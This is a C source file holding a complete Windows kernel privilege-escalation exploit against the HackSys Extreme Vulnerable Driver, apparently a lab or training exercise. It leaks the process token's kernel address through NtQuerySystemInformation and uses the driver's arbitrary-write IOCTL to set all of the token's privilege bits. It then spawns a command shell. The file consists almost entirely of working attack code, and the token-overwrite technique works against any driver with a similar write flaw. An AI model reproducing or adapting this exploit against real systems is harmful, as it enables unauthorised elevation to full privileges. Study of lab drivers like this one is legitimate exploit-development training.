#include<stdio.h>
#include<windows.h>
#include<ntstatus.h>
#include "exploit.h"

_NtQuerySystemInformation NtQuerySystemInformation;

int main() {

	HANDLE hToken;
	HANDLE proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
	if (!proc) {
		printf("[-] Failed to retrieve handle to current process. Error = %#llx\n", GetLastError());
	}
	else {
		printf("[+] Handle for current process = %#llx\n", (ULONG64)proc);
	}
	if (!OpenProcessToken(proc, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &hToken)) {
		printf("[-] Failed to retrieve access token for current process. Error = %#llx\n", GetLastError());
	}
	else {
		printf("[+] Handle for Access token of current process = %#llx\n", (ULONG64)hToken);
	}
	ULONG64 Pid = GetCurrentProcessId();
	printf("[+] Pid of current process = %#llx\n", Pid);

	HMODULE ntdllh = LoadLibraryA("ntdll.dll");
	if (!ntdllh) {
		printf("[-] Failed to load ntdll. Error = %#llx\n", GetLastError());
	}
	else {
		printf("[+] Loaded ntdll address = %#llx\n", ntdllh);
	}
	NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(ntdllh, "NtQuerySystemInformation");
	if (!NtQuerySystemInformation) {
		printf("[-] Failed to find NtQuerySystemInformation. Error = %#llx\n", GetLastError());
	}
	else {
		printf("[+] NtQuerySystemInformation address = %#llx\n", (ULONG64)NtQuerySystemInformation);
	}

	PSYSTEM_HANDLE_INFORMATION_EX InfoBuf = NULL;
	ULONG InfoSize = 0x1000;
	ULONG retLength = 1;
	NTSTATUS status = 0;
	SIZE_T Token = 0;
	SIZE_T TokenPrivsPresent = 0;
	SIZE_T TokenPrivsEnabled = 0;

	do
	{
		InfoSize = retLength;
		InfoBuf = (PSYSTEM_HANDLE_INFORMATION_EX)LocalAlloc(LPTR, InfoSize);
		if (!InfoBuf) {
			printf("[-] Failed to allocate InfoBuf. Error = %#llx\n", GetLastError());
		}
		status = NtQuerySystemInformation(SystemExtendedHandleInformation, (PVOID)InfoBuf, InfoSize, &retLength);
	} while (status == STATUS_INFO_LENGTH_MISMATCH);

	if (NT_SUCCESS(status))
	{
		for (ULONG i = 0; i < InfoBuf->NumberOfHandles; i++)
		{
			if (Pid == (ULONG64)InfoBuf->Handles[i].UniqueProcessId && (SIZE_T)hToken == (SIZE_T)InfoBuf->Handles[i].HandleValue)
			{
				Token = (SIZE_T)InfoBuf->Handles[i].Object;
				TokenPrivsPresent = Token + 0x40;
				TokenPrivsEnabled = Token + 0x48;
				printf("[+] Token of current process = %#llx\n", Token);
				LocalFree(InfoBuf);
				break;
			}
		}
	}
	DWORD BytesReturned = 0;
	LPCSTR lpFileName = (LPCSTR)DEVICE_NAME;
	HANDLE dh = CreateFileA(lpFileName,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		NULL);
	if (dh == INVALID_HANDLE_VALUE) {
		printf("[-] Failed to acquire device handle. Error = %#llx\n", GetLastError());
	}
	else {
		printf("[+] Device File handle = %#llx\n", dh);
	}

	printf("[*] Overwriting privileges of token .....\n");
	ULONG64 payload = 0xffffffffffffffff;
	struct _write_what_where arb_write = { (ULONG64)&payload, TokenPrivsPresent };
	if (!DeviceIoControl(dh, HEVD_ARB_WRITE, &arb_write, 0x10, NULL, 0, &BytesReturned, NULL)) {
		printf("[-] Failed to overwrite privileges of token. Error = %#llx\n", GetLastError());
	}
	arb_write.what = (ULONG64)&payload;
	arb_write.where = TokenPrivsEnabled;
	if (!DeviceIoControl(dh, HEVD_ARB_WRITE, &arb_write, 0x10, NULL, 0, &BytesReturned, NULL)) {
		printf("[-] Failed to overwrite privileges of token. Error = %#llx\n", GetLastError());
	}
	printf("[+] Should have elevated privs now!!!\n");
	system("cmd.exe");
	
	return 0;
}
